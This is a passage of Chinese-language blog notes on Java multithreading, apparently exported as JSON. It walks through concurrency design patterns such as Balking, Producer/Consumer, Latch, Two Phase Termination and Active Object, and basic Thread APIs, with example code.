} catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        return \"435467523543\" + Thread.currentThread().getId();\n    }\n}\n```\n\n```java\n/**\n * 测试类\n */\npublic class ContextTest {\n    public static void main(String[] args) {\n        IntStream.range(1, 5)\n                .forEach(i ->\n                        new Thread(new ExecutionTask()).start()\n                );\n    }\n}\n```\n\n# Chapter12：Balking设计模式\n\n某个线程发现其他线程正在执行相同的任务而放弃即将开始的任务（修改之前的判断）\n\n> Java高并发编程详解：第二十二章\n\n```java\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.Writer;\n\n\n/**\n * balking 设计模式核心：save 方法\n */\npublic class BalkingData {\n    private String fileName;\n    private String content;\n    private boolean changed;\n\n    public BalkingData(String fileName, String content) {\n        this.fileName = fileName;\n        this.content = content;\n        this.changed = true;\n    }\n\n    public synchronized void change(String newContent) {\n        this.content = newContent;\n        this.changed = true;\n    }\n\n    /**\n     * 多个线程同时执行保存任务，其中一个线程完成后changed被调整，另外一个线程不会继续执行\n     */\n    public synchronized void save() throws IOException {\n        if (!changed) {\n            return;\n        }\n        doSave();\n        this.changed = false;\n    }\n\n\n    private void doSave() throws IOException {\n        System.out.println(Thread.currentThread().getName() + \" calls do save. content = \" + content);\n        try (Writer writer = new FileWriter(fileName, true)) {\n            writer.write(content);\n            writer.write(System.getProperty(\"line.separator\"));\n            writer.flush();\n        }\n    }\n}\n```\n\n```java\n/**\n * 线程A: 程序触发保存任务\n */\npublic class CustomerThread extends Thread {\n    private final BalkingData balkingData;\n\n    private final Random random = new Random(System.currentTimeMillis());\n\n    public CustomerThread(BalkingData balkingData) {\n        super(\"Customer\");\n        this.balkingData = balkingData;\n    }\n\n    @Override\n    public void run() {\n        try {\n            // 保存数据\n            balkingData.save();\n            for (int i = 0; i < 20; i++) {\n                // 变更数据\n                balkingData.change(\"No.\" + i);\n                Thread.sleep(random.nextInt(1_000));\n                // 保存数据\n                balkingData.save();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n```java\n/**\n * 线程B：后台自动保存\n */\npublic class WaiterThread extends Thread {\n    private final BalkingData balkingData;\n\n    public WaiterThread(BalkingData balkingData) {\n        super(\"Waiter\");\n        this.balkingData = balkingData;\n    }\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 20; i++) {\n            try {\n                // 后台自动保存\n                balkingData.save();\n                Thread.sleep(200L);\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n```java\n/**\n * 测试类\n */\npublic class BalkingTest {\n    public static void main(String[] args) {\n        String fileName = \"D:\\\\RECEIVED\\\\test.txt\";\n        String content = \">>>>>>>> BEGIN <<<<<<<<<<<<\";\n        BalkingData balkingData = new BalkingData(fileName, content);\n        new WaiterThread(balkingData).start();\n        new CustomerThread(balkingData).start();\n    }\n}\n```\n\n# Chapter13：生产者/消费者模式\n\n```java\n`/**\n * 消费主体\n */\npublic class Message {\n    private String data;\n\n    public Message(String data) {\n        this.data = data;\n    }\n\n    public String getData() {\n        return data;\n    }\n}\n```\n\n```java\n/**\n * 消费队列\n */\npublic class MessageQueue {\n\n    private final static int DEFAULT_MAX_LIMIT = 100;\n\n    private final LinkedList<Message> queue;\n\n    private final int limit;\n\n    public MessageQueue() {\n        this(DEFAULT_MAX_LIMIT);\n    }\n\n    public MessageQueue(final int limit) {\n        this.limit = limit;\n        this.queue = new LinkedList<>();\n    }\n\n\n    public void put(Message message) throws InterruptedException {\n        synchronized (queue) {\n            while (queue.size() > limit) {\n                queue.wait();\n            }\n\n            queue.addLast(message);\n            queue.notifyAll();\n        }\n    }\n\n    public Message take() throws InterruptedException {\n        synchronized (queue) {\n            while (queue.size() == 0) {\n                queue.wait();\n            }\n\n            Message message = queue.removeFirst();\n            queue.notifyAll();\n            return message;\n        }\n    }\n}\n```\n\n```java\nimport java.util.Random;\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * 生产者\n */\npublic class ProducerThread extends Thread {\n    private final MessageQueue messageQueue;\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    private final static AtomicInteger counter = new AtomicInteger(0);\n\n\n    public ProducerThread(MessageQueue messageQueue, int seq) {\n        super(\"PRODUCER-\" + seq);\n        this.messageQueue = messageQueue;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = new Message(\"Message-\" + counter.getAndIncrement());\n                messageQueue.put(message);\n                System.out.println(Thread.currentThread().getName() + \" put message \" + message.getData());\n                Thread.sleep(random.nextInt(1000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n}\n```\n\n```java\n/**\n * 消费者\n */\npublic class ConsumerThread extends Thread {\n    private final MessageQueue messageQueue;\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    public ConsumerThread(MessageQueue messageQueue, int seq) {\n        super(\"CONSUMER-\" + seq);\n        this.messageQueue = messageQueue;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = messageQueue.take();\n                System.out.println(Thread.currentThread().getName() + \" take message \" + message.getData());\n                Thread.sleep(random.nextInt(1000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n}\n```\n\n```java\n/**\n * 测试类\n */\npublic class ProducerAndConsumerClient {\n    public static void main(String[] args) {\n        final MessageQueue messageQueue = new MessageQueue();\n        new ProducerThread(messageQueue, 1).start();\n        new ProducerThread(messageQueue, 2).start();\n        new ProducerThread(messageQueue, 3).start();\n        new ConsumerThread(messageQueue, 1).start();\n        new ConsumerThread(messageQueue, 2).start();\n    }\n}\n```\n\n# Chapter14：Latch 设计模式（阀门设计模式）\n\n> Java高并发编程详解：第二十三章\n\n等待所有条件满足时，阀门才会被打开：利用CountDownLatch\n\n```java\nimport java.util.Random;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.stream.IntStream;\n\npublic class JDKCountDown {\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) throws InterruptedException {\n        final CountDownLatch latch = new CountDownLatch(5);\n        System.out.println(\"准备多线程处理任务.\");\n        //The first phase.\n        IntStream.rangeClosed(1, 5).forEach(i ->\n                new Thread(() -> {\n                    System.out.println(Thread.currentThread().getName() + \" is working.\");\n                    try {\n                        Thread.sleep(random.nextInt(1000));\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                    latch.countDown();\n                }, String.valueOf(i)).start()\n        );\n        // 无限等待\n        latch.await();\n        //The second phase.\n        System.out.println(\"多线程任务全部结束,准备第二阶段任务\");\n        System.out.println(\"............\");\n        System.out.println(\"FINISH\");\n    }\n}\n```\n\n# Chapter15：Thread-Per-Message 设计模式\n\n> Java高并发编程详解：第二十四章\n\n为每一个消息的处理开辟一个线程，使得消息能够以并发的方式进行处理，从而提高系统整体的吞吐能力。\n\n```java\npublic class Message {\n    private final String value;\n\n    public Message(String value) {\n        this.value = value;\n    }\n\n    public String getValue() {\n        return value;\n    }\n}\n```\n\n```java\nimport java.util.Random;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class MessageHandler {\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    private final static ExecutorService executor = Executors.newFixedThreadPool(5);\n\n    public void request(Message message) {\n        executor.execute(() -> {\n            String value = message.getValue();\n            try {\n                Thread.sleep(random.nextInt(1000));\n                System.out.println(\"The message will be handle by \" + Thread.currentThread().getName() + \" \" + value);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void shutdown() {\n        executor.shutdown();\n    }\n}\n```\n\n```java\nimport java.util.stream.IntStream;\n\npublic class PerThreadClient {\n    public static void main(String[] args) {\n        final MessageHandler handler = new MessageHandler();\n        IntStream.rangeClosed(0, 10)\n                .forEach(\n                        i -> handler.request(new Message(String.valueOf(i)))\n                );\n\n        handler.shutdown();\n    }\n}\n```\n\n# Chapter16：Two Phase Termination 设计模式\n\n> Java高并发编程详解：第二十五章\n\n\n\n当一个线程正常结束，我们需要考虑如何正常释放线程中资源：文件句柄、Socket套接字句柄、数据库连接等\n\n![image-20220120111130525](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220120111130525-1667230559747-59.png) \n\n\n\n在第二阶段释放资源的时候需要考虑如下几个问题：\n\n- 第二阶段的终止需要保证安全性，比如涉及对共享资源的操作\n- 对资源的释放时间需要控制在一个可控的时间范围内\n- 要百分百的确保线程的结束：第二阶段出现死循环、线程阻塞等异常无法结束\n\n\n\n1. 简单的two phrase termination 设计模式实现：利用finally执行\n\n```java\nimport java.util.Random;\n\npublic class CounterIncrement extends Thread {\n\n    private volatile boolean terminated = false;\n\n    private int counter = 0;\n\n    private Random random = new Random(System.currentTimeMillis());\n\n    @Override\n    public void run() {\n        try {\n            while (!terminated) {\n                System.out.println(Thread.currentThread().getName() + \" \" + counter++);\n                Thread.sleep(random.nextInt(1000));\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            this.clean();\n        }\n    }\n\n    /**\n     * 执行程序结束后的任务\n     */\n    private void clean() {\n        System.out.println(\"do some clean work for the second phase,current counter \" + counter);\n    }\n\n\n    /**\n     * 结束线程\n     */\n    public void close() {\n        this.terminated = true;\n    }\n}\n```\n\n```java\npublic class CounterTest {\n    public static void main(String[] args) throws InterruptedException {\n        CounterIncrement counterIncrement = new CounterIncrement();\n        counterIncrement.start();\n        Thread.sleep(10_000L);\n        counterIncrement.close();\n    }\n}\n```\n\n\n\n2. Socket套接字\n\n   - 服务端\n\n     线程池容量为2，等待其他连接关闭，才会处理第三个链接任务\n\n     ```java\n     import java.io.IOException;\n     import java.net.ServerSocket;\n     import java.net.Socket;\n     import java.util.LinkedList;\n     import java.util.List;\n     import java.util.concurrent.ExecutorService;\n     import java.util.concurrent.Executors;\n     \n     public class AppServer extends Thread {\n     \n     \n         private final int port;\n     \n         private static final int DEFAULT_PORT = 12722;\n     \n         private volatile boolean start = true;\n     \n         private final List<ClientHandler> clientHandlers = new LinkedList<>();\n     \n         private final ExecutorService executor = Executors.newFixedThreadPool(2);\n     \n         private ServerSocket serverSocket;\n     \n         public AppServer() {\n             this.port = DEFAULT_PORT;\n         }\n     \n         public AppServer(int port) {\n             this.port = port;\n         }\n     \n         @Override\n         public void run() {\n             try {\n                 this.serverSocket = new ServerSocket(port);\n                 System.out.println(\"端口：\" + port + \"，正在等待客户端连接.....\");\n                 while (start) {\n                     // 获取客户端链接\n                     Socket client = serverSocket.accept();\n                     // 保留客户端链接，用于退出前的清理 \n                     ClientHandler clientHandler = new ClientHandler(client);\n                     clientHandlers.add(clientHandler);\n                     // 提交任务处理\n                     executor.submit(clientHandler);\n                 }\n             } catch (IOException e) {\n                 e.printStackTrace();\n             } finally {\n                 this.dispose();\n             }\n         }\n     \n         /**\n          * 清理线程程池资源\n          */\n         private void dispose() {\n             System.out.println(\"清理线程程池资源.....\");\n             // 关闭客户端链接\n             clientHandlers.stream().forEach(e -> e.shutDown());\n             executor.shutdown();\n         }\n     \n         /**\n          * 关闭服务端\n          */\n         public void shutDown() {\n             System.out.println(\"关闭服务端.....\");\n             this.start = false;\n             this.interrupt();\n             try {\n                 serverSocket.close();\n                 System.out.println(\"服务端正常关闭\");\n             } catch (IOException e) {\n                 System.out.println(\"服务端关闭失败 : \" + e.getMessage());\n             }\n         }\n     }\n     ```\n\n     \n\n   - 客户端\n\n     ```java\n     import java.io.*;\n     import java.net.Socket;\n     \n     /**\n      * 处理客户端请求\n      */\n     public class ClientHandler extends Thread {\n         private volatile boolean running = true;\n     \n         private final Socket socket;\n     \n         public ClientHandler(Socket socket) {\n             this.socket = socket;\n         }\n     \n         @Override\n         public void run() {\n             try (InputStream inputStream = socket.getInputStream();\n                  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n                  OutputStream outputStream = socket.getOutputStream();\n                  PrintWriter printWriter = new PrintWriter(outputStream);\n             ) {\n                 while (running) {\n                     // 读取客户端提供数据\n                     String message = bufferedReader.readLine();\n                     if (message == null) {\n                         break;\n                     }\n                     System.out.println(\"读取客户端数据 >\" + message);\n                     // 回写数据给客户端\n                     printWriter.write(\"echo \" + message + \"\\n\");\n                     printWriter.flush();\n                 }\n                 System.out.println(\"客户端正常关闭\");\n             } catch (IOException e) {\n                 e.printStackTrace();\n             } finally {\n                 this.shutDown();\n             }\n         }\n     \n         public void shutDown() {\n             if (!running) {\n                 // 客户端已经执行完成：balking设计模式\n                 return;\n             }\n             this.running = false;\n             try {\n                 this.socket.close();\n                 System.out.println(\"客户端正常关闭\");\n             } catch (IOException e) {\n                 System.out.println(\"客户端关闭失败：\" + e.getMessage());\n             }\n         }\n     }\n     ```\n\n   - 测试类：启动服务端\n\n     ```java\n     public class AppServerClient {\n         public static void main(String[] args) throws InterruptedException {\n             AppServer appServer = new AppServer(12312);\n             appServer.start();\n     \n             // Thread.sleep(20_000L);\n             // appServer.shutDown();\n         }\n     }\n     ```\n\n     \n\n# Chapter17：Worker-Thread 设计模式\n\n 线程池在某种意义上也是一种worker-thread设计模式的实现\n\n> Java高并发编程详解：第二十六章\n\n# Chapter18：Active Objects 设计模式\n\n拥有独立线程的对象（主动对象）接受异步消息，并且能够返回处理结果的设计模式\n\n\n![active-object设计模式](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/1fe2af03-d148-4791-adfe-993c1c9ec1db.png)  \n\n\n\n\n\n功能说明：提交任务、执行任务拆分为两个独立的线程\n\n1. `ActiveObjectFactory `创建` ActiveObjectProxy`，ActiveObjectProxy 包含了 ActiveObject的两种行为方式\n\n2. `ActiveObjectProxy ` 包含一个执行任务线程： `SchedulerThread `，创建即启动，监听任务队列`ActivationQueue`，有任务，就处理。\n\n3. `ActiveObjectProxy ` 接收到的 `makeString `任务和 `displayString `任务都被包装为`MethodRequest`提交到`SchedulerThread`的任务队列`ActivationQueue`。\n\n   每个任务的具体执行包含在`MethodRequest`中（抽象的`execute`方法，由子类实现）。 \n\n4. `MethodRequest`执行`execute`任务之后 ，将执行结果反馈给`FutureResult`\n\n具体代码如下\n\n```java\n/**\n * 任务定义接口\n */\npublic interface ActiveObject {\n\n    Result makeString(int count, char fillChar);\n\n    void displayString(String text);\n}\n```\n\n\n\n```java\nclass ActiveObjectProxy implements ActiveObject {\n    private final SchedulerThread schedulerThread;\n\n    private final Servant servant;\n\n    public ActiveObjectProxy(SchedulerThread schedulerThread, Servant servant) {\n        this.schedulerThread = schedulerThread;\n        this.servant = servant;\n    }\n\n\n    /**\n     * 将提交的request任务（makeString）推送到执行线程\n     *\n     * @return FutureResult：包装任务完成的执行结果\n     */\n    @Override\n    public Result makeString(int count, char fillChar) {\n        FutureResult future = new FutureResult();\n        schedulerThread.invoke(new MakeStringRequest(servant, future, count, fillChar));\n        return future;\n    }\n\n    /**\n     * 将提交的request任务（displayString）推送到执行线程\n     */\n    @Override\n    public void displayString(String text) {\n        schedulerThread.invoke(new DisplayStringRequest(servant, text));\n    }\n}\n```\n\n\n\n```java\n/**\n * 任务的具体定义类\n */\nclass Servant implements ActiveObject {\n\n    @Override\n    public Result makeString(int count, char fillChar) {\n        char[] buf = new char[count];\n        for (int i = 0; i < count; i++) {\n            buf[i] = fillChar;\n            try {\n                Thread.sleep(10);\n            } catch (Exception e) {\n\n            }\n        }\n        return new RealResult(new String(buf));\n    }\n\n    @Override\n    public void displayString(String text) {\n        try {\n            System.out.println(\"Display:\" + text);\n            Thread.sleep(10);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n```java\n/**\n * 由SchedulerThread管理的任务队列\n */\nclass ActivationQueue {\n\n    private final static int MAX_METHOD_REQUEST_QUEUE_SIZE = 100;\n\n    private LinkedList<MethodRequest> methodQueue;\n\n    public ActivationQueue() {\n        methodQueue = new LinkedList<>();\n    }\n\n    /**\n     * 提交任务到任务队列\n     */\n    public synchronized void put(MethodRequest request) {\n        while (methodQueue.size() >= MAX_METHOD_REQUEST_QUEUE_SIZE) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n\n        methodQueue.addFirst(request);\n        this.notifyAll();\n    }\n\n\n    /**\n     * 从任务队列提取任务\n     */\n    public synchronized MethodRequest take() {\n        while (methodQueue.isEmpty()) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        MethodRequest methodRequest = methodQueue.removeFirst();\n        this.notifyAll();\n        return methodRequest;\n    }\n}\n```\n\n```java\nimport java.util.LinkedList;\n\npublic class SchedulerThread extends Thread {\n\n    private final ActivationQueue activationQueue;\n\n    public SchedulerThread(ActivationQueue activationQueue) {\n        this.activationQueue = activationQueue;\n    }\n\n    /**\n     * 提交任务到任务队列\n     */\n    public void invoke(MethodRequest request) {\n        this.activationQueue.put(request);\n    }\n\n    /**\n     * 执行任务队列中的任务\n     */\n    @Override\n    public void run() {\n        while (true) {\n            // 执行提交的任务的任务主体\n            // execute的内容，存在于提交的request中\n            activationQueue.take().execute();\n        }\n    }\n}\n```\n\n```java\npublic interface Result {\n    Object getResultValue();\n}\n\n/**\n * 仅包可见\n */\nclass RealResult implements Result {\n\n    private final Object resultValue;\n\n\n    public RealResult(Object resultValue) {\n        this.resultValue = resultValue;\n    }\n\n    @Override\n    public Object getResultValue() {\n        return resultValue;\n    }\n}\n\n/**\n * 返回的任务结果，仅包可见\n */\nclass FutureResult implements Result {\n\n    private Result result;\n    private boolean ready = false;\n\n    public synchronized void setResult(Result result) {\n        this.result = result;\n        this.ready = true;\n        // 通知等待提取任务结果的线程，任务结束\n        this.notifyAll();\n    }\n\n    @Override\n    public synchronized Object getResultValue() {\n        while (!ready) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        return this.result.getResultValue();\n    }\n}\n```\n\n\n\n```java\nabstract class MethodRequest {\n    protected final Servant servant;\n\n    protected final FutureResult futureResult;\n\n    public MethodRequest(Servant servant, FutureResult futureResult) {\n        this.servant = servant;\n        this.futureResult = futureResult;\n    }\n\n    /**\n     * 提交任务的抽象方法。具体执行内容由子类定义。\n     * 执行者交给servant，执行结果包装到futureResult中\n     */\n    public abstract void execute();\n}\n```\n\n\n\n```java\nclass MakeStringRequest extends MethodRequest {\n    private final int count;\n    private final char fillChar;\n\n    public MakeStringRequest(Servant servant, FutureResult futureResult, int count, char fillChar) {\n        super(servant, futureResult);\n        this.fillChar = fillChar;\n        this.count = count;\n    }\n\n    /**\n     * 任务执行的主体\n     */\n    @Override\n    public void execute() {\n        futureResult.setResult(servant.makeString(count, fillChar));\n    }\n}\n\nclass DisplayStringRequest extends MethodRequest {\n    private final String text;\n\n    public DisplayStringRequest(Servant servant, final String text) {\n        super(servant, null);\n        this.text = text;\n    }\n\n    /**\n     * 任务执行的主体\n     */\n    @Override\n    public void execute() {\n        this.servant.displayString(text);\n    }\n}\n```\n\n```java\npublic final class ActiveObjectFactory {\n    public static ActiveObject createActiveObject() {\n        Servant servant = new Servant();\n        ActivationQueue queue = new ActivationQueue();\n        SchedulerThread schedulerThread = new SchedulerThread(queue);\n        ActiveObjectProxy proxy = new ActiveObjectProxy(schedulerThread, servant);\n        schedulerThread.start();\n        return proxy;\n    }\n}\n```\n\n\n\n以上对外开放的类仅仅`ActiveObjectFactory`、`ActiveObject`、`Result`\n\n以下为测试代码\n\n```java\nimport com.hots.part2.chapter18.action.ActiveObject;\n\npublic class DisplayClientThread extends Thread {\n\n    private final ActiveObject activeObject;\n\n    public DisplayClientThread(String name, ActiveObject activeObject) {\n        super(name);\n        this.activeObject = activeObject;\n    }\n\n    @Override\n    public void run() {\n        try {\n            for (int i = 0; true; i++) {\n                String text = Thread.currentThread().getName() + \"=>\" + i;\n                activeObject.displayString(text);\n                Thread.sleep(200);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n```java\nimport com.hots.part2.chapter18.action.ActiveObject;\nimport com.hots.part2.chapter18.action.Result;\n\npublic class MakerClientThread extends Thread {\n\n    private final ActiveObject activeObject;\n    private final char fillChar;\n\n    public MakerClientThread(ActiveObject activeObject, String name) {\n        super(name);\n        this.activeObject = activeObject;\n        this.fillChar = name.charAt(0);\n    }\n\n    @Override\n    public void run() {\n        try {\n            for (int i = 0; true; i++) {\n                Result result = activeObject.makeString(i + 1, fillChar);\n                Thread.sleep(20);\n                String value = (String) result.getResultValue();\n                System.out.println(Thread.currentThread().getName() + \": value=\" + value);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n```java\nimport com.hots.part2.chapter18.action.ActiveObject;\nimport com.hots.part2.chapter18.action.ActiveObjectFactory;\n\npublic class Test {\n    public static void main(String[] args) {\n        ActiveObject activeObject = ActiveObjectFactory.createActiveObject();\n        // 制造makeString的请求\n        new MakerClientThread(activeObject, \"Alice\").start();\n        // 制造displayString的请求\n        new MakerClientThread(activeObject, \"Bobby\").start();\n\n        new DisplayClientThread(\"Chris\", activeObject).start();\n    }\n}\n```\n\n# Chapter19：Event Bus 中介者模式\n\n# Chapter20：Event Driven 事件驱动设计模式\n","tags":["Java"],"categories":["后端","Java"]},{"title":"多线程基础","url":"/20250619/53471b9a.html","content":"\n##  Chapter1：快速认识线程\n\n### 继承Thread类创建线程类（模板设计模式）\n\n（1）定义Thread类的子类，并重写该类的run方法，该run方法的方法体就代表了线程要完成的任务。因此把run()方法称为执行体。\n\n（2）创建Thread子类的实例，即创建了线程对象。\n\n（3）调用线程对象的start()方法来启动该线程。\n\n```java\nimport java.util.concurrent.atomic.AtomicInteger;\n// 定义Thread类的子类，并重写该类的run方法\npublic class TicketWindow extends Thread {\n    private final int MAX = 50;\n    private static AtomicInteger index = new AtomicInteger(0);\n\n    private String name;\n\n    public TicketWindow(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public void run() {\n        while (index.get() <= MAX) {\n            System.out.println(\"柜台：\" + name + \"当前的号码是：\" + index.addAndGet(1));\n        }\n    }\n}\n```\n\n```java\n@Test\npublic void bankTest1() {\n  // step2：创建Thread子类的实例，即创建了线程对象\n  TicketWindow ticketWindow1 = new TicketWindow(\"一号\");\n  // step3: 调用线程对象的start()方法来启动该线程\n  ticketWindow1.start();\n  TicketWindow ticketWindow2 = new TicketWindow(\"二号\");\n  ticketWindow2.start();\n  TicketWindow ticketWindow3 = new TicketWindow(\"三号\");\n  ticketWindow3.start();\n  TicketWindow ticketWindow4 = new TicketWindow(\"四号\");\n  ticketWindow4.start();\n}\n```\n\n### 通过Runnable接口创建线程类（策略模式的应用）\n\n为了将可执行的控制单元和线程控制分割开来\n\n（1）定义runnable接口的实现类，并重写该接口的run()方法，该run()方法的方法体同样是该线程的线程执行体。\n\n（2）创建 Runnable实现类的实例，并依此实例作为Thread的target来创建Thread对象，该Thread对象才是真正的线程对象。\n\n（3）调用线程对象的start()方法来启动该线程。\n\n```java\npublic class TickWindowRunnable implements Runnable {\n    private final int MAX = 50;\n    private int index = 1;\n\n    @Override\n    public void run() {\n        while (index <= MAX) {\n            System.out.println(Thread.currentThread().getName() + \"的号码是：\" + index++);\n        }\n    }\n}\n```\n\n```java\n@Test\npublic void bankTest2() {\n  TickWindowRunnable ticketWindowRunnable = new TickWindowRunnable();\n  Thread ticketWindow1 = new Thread(ticketWindowRunnable, \"一号\");\n  Thread ticketWindow2 = new Thread(ticketWindowRunnable, \"二号\");\n  Thread ticketWindow3 = new Thread(ticketWindowRunnable, \"三号\");\n  Thread ticketWindow4 = new Thread(ticketWindowRunnable, \"四号\");\n\n  ticketWindow1.start();\n  ticketWindow2.start();\n  ticketWindow3.start();\n  ticketWindow4.start();\n}\n\n\n//java8改造\n @Test\npublic void bankTest3() {\n  final int MAX = 50;\n  final AtomicInteger index = new AtomicInteger(0);\n  final Runnable runnable = () -> {\n    while (index.get() <= MAX) {\n      System.out.println(Thread.currentThread().getName() + \"的号码是：\" + index.addAndGet(1));\n    }\n  };\n\n  Thread ticketWindow1 = new Thread(runnable, \"一号\");\n  Thread ticketWindow2 = new Thread(runnable, \"二号\");\n  Thread ticketWindow3 = new Thread(runnable, \"三号\");\n  Thread ticketWindow4 = new Thread(runnable, \"四号\");\n\n  ticketWindow1.start();\n  ticketWindow2.start();\n  ticketWindow3.start();\n  ticketWindow4.start();\n}\n```\n\n## Chapter2：深入理解Thread的构造函数\n\n| 序号 | 方法                                                         | 说明                                                         |\n| :--- | :----------------------------------------------------------- | ------------------------------------------------------------ |\n| 1    | Thread()                                                     | Allocates a new Thread object.                               |\n| 2    | Thread(Runnable target)                                      | Allocates a new Thread object.                               |\n| 3    | Thread(Runnable target, String name)                         | Allocates a new Thread object.                               |\n| 4    | Thread(String name)                                          | Allocates a new Thread object.                               |\n| 5    | Thread(ThreadGroup group, Runnable  target)                  | Allocates a new Thread object.                               |\n| 6    | Thread(ThreadGroup group, Runnable  target, String name)     | Allocates a new Thread object so that it has target as its run object,  has the specified name as its name, and belongs to the thread group referred  to by group. |\n| 7    | Thread(ThreadGroup group, Runnable  target, String name, long stackSize) | Allocates a new Thread object so that it has target as its run object,  has the specified name as its name, and belongs to the thread group referred  to by group, and has the specified stack size. |\n| 8    | Thread(ThreadGroup group, String  name)                      | Allocates a new Thread object.                               |\n\n### Thread命名\n\n1. 默认线程名称，按照编号，从0开始递增。线程一旦启动，线程名不可再进行更改。\n\n   ```java\n   public Thread() {\n     init(null, null, \"Thread-\" + nextThreadNum(), 0);\n   }\n   ```\n\n### Thread和ThreadGroup\n\n1. main线程所在的ThreadGroup称为main\n2. 构造一个线程如果没有显示的指定ThreadGroup，他将和父线程在同一个ThreadGroup\n\n### Thread和stackSize\n\n```java\n/**\n* 测试默认栈深度 \n*/\npublic class TestStack {\n    private int counter = 0;\n\n    private void recur() {\n        counter++;\n        recur();//递归\n    }\n\n    public void getStackDepth() {\n        try {\n            recur();\n        } catch (Throwable t) {\n            System.out.println(\"栈最大深度：\" + counter);\n            t.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        TestStack stack = new TestStack();\n        stack.getStackDepth();\n    }\n}\n\n\n结果：18368  \n\n# 查看配置\njinfo -flag ThreadStackSize  16320\n```\n\n###  守护线程\n\n设置守护线程的方法很简单，调用**setDaemon**方法即可，true代表守护线程，false代表正常线程。\n\n线程是否为守护线程和它的父线程有很大的关系，如果父线程是正常线程，则子线程也是正常线程，反之亦然，如果你想要修改它的特性则可以借助方法。\n**isDaemon**方法可以判断该线程是不是守护线程。\n\n另外需要注意的就是，**setDaemon方法只在线程启动之前才能生效**，如果一个线程已经死亡，那么再设置setDaemon则会抛出**IllegalThreadStateException**异常。\n\n## Chapter3： Thread API\n\n```java\npublic final void setName(String name) // 设置线程名称\npublic final void setPriority(int newPriority) // 设置线程优先级\n```\n\n### join()\n\n```java\npublic final void join()\n  \n// 主线程等待线程threadTest1、threadTest2执行完成\n// threadTest1、threadTest2 交替执行\nthreadTest1.join();\nthreadTest2.join();\n\n\n\n// 以下写法，main 线程等待main 线程结束，所有程序一直处于等待状态，无法终止。\npublic static void main(String[] args) throws Exception{\n  Thread.currentThread().join();\n}\n```\n\n###  interrupt()\n\n如下方法的调用会使得当前线程进人阻塞状态，而调用当前线程的interrupt方法，就可以打断阻塞。\n\n```java\njoin()、sleep()、wait()...\n```\n\n上述若干方法都会使得当前线程进人阻塞状态，若另外的一个线程调用被阻塞线程的**interrupt**方法，则会打断这种阻塞，因此这种方法有时会被称为可中断方法。\n\n==打断一个线程并不等于该线程的生命周期结束，仅仅是打断了当前线程的阻塞状态==。\n\n一旦线程在阻塞的情况下被打断，都会抛出一个称为**InterruptedException**的异常，这个异常就像一个signal（信号）一样通知当前线程被打断了。\n\n### 合理关闭一个线程\n\n1. 利用中断信号\n\n   ```java\n   public static void main(String[] args) throws InterruptedException {\n   \tThread t1 = new Thread() {\n   \t\t@Override\n   \t\tpublic void run() {\n   \t\t\tSystem.out.println(\"I will start work.\");\n   \t\t\twhile (!isInterrupted()) {\n   \t\t\t\t// working\n   \t\t\t}\n   \t\t\tSystem.out.println(\"I will be exiting.\");\n   \t\t}\n   \t};\n   \tt1.start();\n   \tTimeUnit.MINUTES.sleep(1);\n   \tSystem.out.println(\"System will be shutdown\");\n   \tt1.interrupt();\n   }\n   ```\n\n   \n\n2. 利用Volatile开关变量控制\n\n   ```java\n   public class StopThread {\n   \n       static class MyThread extends Thread {\n           private volatile boolean shutdown = false;\n   \n           @Override\n           public void run() {\n               System.out.println(\"I will start work.\");\n               while (!shutdown) {\n                   // working\n               }\n               System.out.println(\"I will be exiting.\");\n           }\n   \n           public void shutdown() {\n               this.shutdown = true;\n           }\n       }\n   \n       public static void main(String[] args) throws InterruptedException {\n           MyThread t1 = new MyThread();\n           t1.start();\n           TimeUnit.SECONDS.sleep(10);\n           System.out.println(\"System will be shutdown\");\n           t1.shutdown();\n       }\n   }\n   ```\n\n\n3. 耗时时间过长，强制退出线程（将执行程序设置为守护线程）\n\n   - 使用执行线程的守护线程执行程序任务\n\n   ```java\n   public class ThreadService {\n     private Thread executeThead;\n   \n     private boolean finished = false;\n   \n     public void execute(Runnable task) {\n       executeThead = new Thread() {\n         @Override\n         public void run() {\n           Thread runner = new Thread(task);\n           runner.setDaemon(true);\n           runner.start();\n           try {\n             // 等待runner执行完成\n             runner.join();\n             finished = true;\n           } catch (InterruptedException e) {\n             // 执行被打断\n             System.out.println(\"执行任务的守护线程被打断\");\n             e.printStackTrace();\n           }\n         }\n       };\n       executeThead.start();\n     }\n   \n     public void shutdown(long miles) 